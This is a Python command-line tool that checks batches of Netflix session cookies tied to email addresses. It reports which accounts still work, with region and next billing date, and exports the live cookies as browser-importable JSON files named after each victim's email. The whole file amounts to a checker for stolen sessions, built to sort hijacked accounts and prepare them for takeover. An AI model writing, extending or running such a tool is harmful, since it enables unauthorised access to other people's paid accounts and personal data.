import argparse
import os
import sys
import asyncio
import json
from datetime import datetime
from cookie_tester import verify_account_async
from netflix_utils import parse_accounts

def format_date_for_filename(date_str):
    if not date_str or date_str == "Unknown":
        return "UnknownDate"
    try:
        # Try "February 4, 2026"
        dt = datetime.strptime(date_str, "%B %d, %Y")
        return dt.strftime("%Y-%m-%d")
    except ValueError:
        pass

    # Try sanitizing
    safe_str = "".join([c if c.isalnum() else "_" for c in date_str])
    return safe_str

def export_cookies_json(cookies, filename):
    # Convert httpx Cookies to list of dicts
    cookie_list = []
    for cookie in cookies.jar:
        # Handle expiration
        exp = cookie.expires

        # Check for httpOnly in _rest (common in http.cookiejar)
        http_only = False
        if hasattr(cookie, '_rest') and 'HttpOnly' in cookie._rest:
             http_only = True

        c_dict = {
            "domain": cookie.domain,
            "expirationDate": exp,
            "hostOnly": not cookie.domain.startswith('.'),
            "httpOnly": http_only,
            "name": cookie.name,
            "path": cookie.path,
            "sameSite": "unspecified",
            "secure": cookie.secure,
            "session": exp is None,
            "storeId": "0",
            "value": cookie.value,
            "id": len(cookie_list) + 1
        }
        cookie_list.append(c_dict)

    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(cookie_list, f, indent=4)

async def run_checks(args):
    # Mode 1: Batch file processing
    filepath = args.file
    # Auto-detect p.txt if no args provided
    if not filepath and not args.cookie and os.path.exists('p.txt'):
        if not args.url:
             filepath = 'p.txt'
             print("No arguments provided. Defaulting to 'p.txt'.")

    if filepath:
        print(f"Reading accounts from {filepath}...")
        accounts = parse_accounts(filepath)
        print(f"Found {len(accounts)} accounts.")

        print(f"Testing cookies against Netflix...\n")

        for acc in accounts:
            email = acc.get('email', 'Unknown')
            cookies = acc.get('cookies', {})

            if not cookies:
                print(f"[-] {email}: No valid cookies found.")
                continue

            result = await verify_account_async(cookies)

            if result:
                 lines = result.get('lines', [])
                 print(f"[+] {email}: Success")
                 for line in lines:
                     print(f"    {line}")
                 print("-" * 40)

                 # Export JSON
                 region = result['info'].get('region', 'Unknown')
                 exp_date = result['info'].get('next_billing_date', 'Unknown')
                 formatted_date = format_date_for_filename(exp_date)

                 # Sanitize email for filename
                 safe_email = "".join([c if c.isalnum() else "_" for c in email])

                 filename = f"{region}_{formatted_date}_{safe_email}.json"

                 try:
                     export_cookies_json(result['cookies'], filename)
                     print(f"    Saved cookies to {filename}")
                 except Exception as e:
                     print(f"    Error saving JSON: {e}")

            else:
                print(f"[-] {email}: Failed / Expired")
        return

    # Mode 2: Single cookie testing
    if args.cookie:
        try:
            key, value = args.cookie.split('=', 1)
            cookie_data = {key: value}
        except ValueError:
            print("Error: Cookie must be in 'name=value' format.")
            return

        print(f"Testing cookie '{args.cookie}'...")
        result = await verify_account_async(cookie_data)

        if result:
            lines = result.get('lines', [])
            for line in lines:
                print(line)

            # Export JSON
            region = result['info'].get('region', 'Unknown')
            exp_date = result['info'].get('next_billing_date', 'Unknown')
            formatted_date = format_date_for_filename(exp_date)

            # Use 'SingleCookie' or similar since email is unknown
            filename = f"{region}_{formatted_date}_SingleCookie.json"

            try:
                export_cookies_json(result['cookies'], filename)
                print(f"    Saved cookies to {filename}")
            except Exception as e:
                print(f"Error saving JSON: {e}")

        else:
            print("Failed to verify cookie.")
        return

    # If args.url is provided but no cookie/file, we can't do much
    if args.url and not args.cookie:
        print("URL provided but no cookie. Use --cookie.")
        sys.exit(1)

    # Fallback if arguments are missing
    print("Usage: python main.py [--file <path> | --cookie <name=value>]")
    sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="Test cookies against Netflix.")
    parser.add_argument("--url", help="Ignored in new version (checks /account).")
    parser.add_argument("--cookie", help="Cookie in 'name=value' format.")
    parser.add_argument("--file", help="Path to a file containing account/cookie data.")
    parser.add_argument("--output", default="live_cookies.txt", help="File to save working cookies to.")

    args = parser.parse_args()

    asyncio.run(run_checks(args))

if __name__ == "__main__":
    main()
